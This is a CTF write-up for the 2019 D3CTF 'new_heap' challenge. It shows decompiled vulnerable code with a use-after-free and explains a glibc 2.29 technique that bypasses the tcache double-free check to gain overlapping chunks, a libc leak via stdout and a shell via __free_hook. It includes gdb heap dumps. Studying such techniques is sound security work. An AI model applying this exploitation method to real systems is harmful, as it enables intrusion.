# 2019 D3CTF

Because of the studies on the weekend, I only solved one problem. BTW, I do not know my solution is expected or not.

## new_heap

A really cumbersome heap pwn and got only 2 solved at last. 

The vulnerabilities is easy to dig out. An obvious "use after free" in free procedure.

```cpp
int __fastcall sub_B42(__int64 a1, __int64 a2)
{
  int idx; // [rsp+Ch] [rbp-4h]

  printf("index:", a2);
  idx = input_int();
  if ( idx < 0 || idx > 17 )
  {
    puts("index out of range");
    exit(0);
  }
  free((void *)note[idx]);
  return puts("done");
}
```

However, there are no mehods for editing or showing. Worse still, our operations is limited to 18 times and chunksize must less than 0x78(fastbin/tache).

```cpp
  if ( result <= 0x78 )
  {
    note[idx] = (__int64)malloc(result);
    printf("content:");
    read(0, (void *)note[idx], (unsigned int)size);
    result = puts("done");
  }
```

Ok, the idea is simple, no showing or editing methods means we must construct a freed fake FD pointer manually, first write `_IO_2_1_stdout` for leaking and later write `__free_hook` for executing `system("/bin/sh")`. So the keypoint is to cause chunk overlapping.

Before that, notice there a `getchar` in main function without `setbuf(stdin,0)`.

```C
if ( v3 == 3 )
{
  a1 = (__int64)"sure?";
  puts("sure?");
  if ( getchar() == 'y' )
    exit(0);
}
```
As a result, `putchar` wil invoke functions to create a large buffer in main_arena heap, and call `malloc_consolidate`to merge fastbins in this process.

Let me talk about potential ideas behind:

1. Double free is impossible, libc-2.29 have added accurate detections for heap exploiting, so the technique such as [tcache dup]( https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c ), [house of atum](https://changochen.github.io/2018-11-26-bctf-2018.html) are useless.
2. Because of the limitions on user's operation, traditional unlink or smallbin attack, like the similar solutions of [lazyhouse](https://github.com/pr0cf5/CTF-writeups/tree/master/2019/hitcon) may be  exhaust the opportunities.
3. Theoretically, we can use the traditional fastbin attack but the number limitations is really annoying. 
4. The existence of `getchar` hint that we must fill tache list to allocate fastbin for using it.

My solution is straight and has a little different with house of atum because of the stuggy double tache check. Howerver, fastbin only limit the `FastbinY[i]` cannot repeat, it inspired me.

Frist, normal free to obtain a fastbin like that.

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x55ce37e24680 --> 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55ce37e24700 (size : 0x20900)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x80)   tcache_entry[6](7): 0x55ce37e24610 --> 0x55ce37e24590 --> 0x55ce37e24510 --> 0x55ce37e243e0 --> 0x55ce37e24360 --> 0x55ce37e242e0 --> 0x55ce37e24260
```

Then, we can simply `malloc(0x78)` allocated 0x55ce37e24610  and free 0x55ce37e24680 again, like behind.

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x5646dc407680 --> 0x5646dc407590 (size error (0x5646dc407010)) --> 0x6161616161616161 (invaild memory)
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5646dc407700 (size : 0x20900)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x80)   tcache_entry[6](7): 0x5646dc407690 (overlap chunk with 0x5646dc407680(freed) )  
```

That's the point, freed 0x55ce37e24680  will insert in the head of `tcache_entry` and do not check the chunks behind. That's to say we can bypass the double tcache check. Like the same effect with house of atum, fastbin chunk’s next points will point to the next tcache. Now we get a large chunk(>0x400) via  `putchar` will let them into unsortedbin.

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55ce37e25690 (size : 0x1f970)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x080)  smallbin[ 6]: 0x55ce37e24430
(0x80)   tcache_entry[6](6): 0x55ce37e24590 --> 0x55ce37e24510 --> 0x55ce37e243e0 (overlap chunk with 0x55ce37e24430(freed) )    
```

Next steps are inside, we can reuse unsorted bin for chunk overlapping and bruteforce leaking libc and getshell at last, in the process, be careful about the limitation on the chunk numbers.The detail is in the new_heap.py.

In conclusion, the method for bypassing double tache check is really awesome. If anyone have better ideas, contact me anyway, thank you.

